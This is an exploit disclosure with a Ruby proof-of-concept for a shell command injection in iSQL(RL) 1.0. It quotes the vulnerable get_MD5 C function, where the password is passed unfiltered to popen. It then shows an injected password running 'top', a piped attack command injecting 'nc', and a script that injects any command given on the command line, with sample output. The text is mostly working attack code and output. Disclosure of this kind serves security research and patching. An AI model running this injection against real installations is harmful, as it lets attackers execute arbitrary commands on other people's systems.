#!/bin/ruby
# Exploit Title: iSQL(RL) 1.0 - Shell Command Injection
# Date: 2016-06-13
# Exploit Author: HaHwul
# Exploit Author Blog: www.hahwul.com
# Vendor Homepage: https://github.com/roselone/iSQL
# Software Link: https://github.com/roselone/iSQL/archive/master.zip
# Version: 1.0
# Tested on: Debian [wheezy]
# CVE : none


=begin
### Vulnerability Point
 :: [isql_main.c 455 line] popen(cmd,"r"); code is vulnerable
 :: don't filtering special characters in str value
446 char *get_MD5(char *str){
447         FILE *stream;
448         char *buf=malloc(sizeof(char)*33);
449         char cmd[100];
450         memset(buf,'\0',sizeof(buf));
451         memset(cmd,'\0',sizeof(cmd));
452         strcpy(cmd,"echo "); //5
453         strcpy((char *)cmd+5,str);
454         strcpy((char *)cmd+5+strlen(str)," | md5sum");
455         stream=popen(cmd,"r");
456         fread(buf,sizeof(char),32,stream);
457 //      printf("%s\n",buf);
458         return buf;
459 }

### Vulnerability Triger
614          while (USER_NUM==-1){
615                 printf(">username:");
616                 scanf("%s",username);
617                 printf(">password:");
618                 scanf("%s",passwd);
619                 md5=get_MD5(passwd);

### Vulnerability Run
>username:asdf;   
>password:asdf;top;echo 1

 (~) #> ps -aux | grep top
root     13279  0.0  0.0   4472   860 pts/1    S+   13:33   0:00 sh -c echo asdf;top;echo | md5sum
root     13280  0.3  0.0  26304  3200 pts/1    S+   13:33   0:00 top

=end 

### Attack command
#> (sleep 5; echo -en 'aasdf\n';sleep 1;echo -en 'asdf;nc;echo 1';sleep 10) | ./isql

### Ruby Code
puts "SQL 1.0 - Shell Command Injection"
puts "by hahwul"
if(ARGV.size != 1)
  puts "Usage: ruby iSQL_command_injection.rb [COMMAND]"
  puts " need ./isql in same directory"
  exit()
else 
  puts "CMD :: "+ARGV[0]
  puts "Run Injection.."
  system("(sleep 5; echo -en 'aasdf\n';sleep 1;echo -en 'asdf;#{ARGV[0]};echo 1';sleep 10) | ./isql")
end

### Sample Output
=begin
#> ruby test.rb nc
# Exploit Title: iSQL 1.0 Shell Command Injection
by hahwul
CMD :: nc
Run Injection..

*************** welcome to ISQL ****************
* version 1.0                                  *
* Designed by RL                               *
* Copyright (c) 2011, RL. All rights reserved  *
************************************************

>username:>password:verify failure , try again !
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
	  [-x proxy_address[:port]] [destination] [port]
>username:>password:verify failure , try again !
^Ctest.rb:10:in `system': Interrupt
	from test.rb:10:in `<main>'
=end
